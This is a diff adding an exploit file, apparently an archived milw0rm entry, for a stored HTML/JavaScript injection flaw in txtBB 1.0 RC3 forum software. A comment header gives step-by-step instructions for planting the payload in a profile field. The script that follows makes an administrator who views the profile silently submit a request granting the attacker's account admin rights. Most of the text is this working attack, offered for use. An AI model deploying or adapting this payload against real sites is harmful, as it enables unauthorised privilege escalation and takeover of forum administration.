@@ -1,0 +1,31 @@
+<!--
+
+txtBB <= 1.0 RC3 HTML/JS Injection - Add Admin Privileges Exploit
+By cOndemned
+	
+Greetz: 
+	ZaBeaTy, sid.psycho, Alfons Luja, vCore, irk4z & str0ke ;)
+
+
+Exploitation:
+	1. Create an account 
+	2. Go to http://[host]/[txtbb10RC3_path]/index.php?type=account 
+	3. Put exploit code into one of the fields ex. "Miasto" ([code] + City name)
+	4. When admin enters U'r account - pwn3d - Your user will get admin rights
+
+
+Exploit Source :
+
+-->
+
+<script>
+
+var req = new XMLHttpRequest(); 
+
+req.open('POST', 'admin.php?action=users&type=edit&login=USER_NICK&save=1', false); 
+req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded'); 
+req.send('signature=&avatar=&type=3&password=&submit=Zapisz');
+
+</script>
+
+# milw0rm.com [2009-02-05]
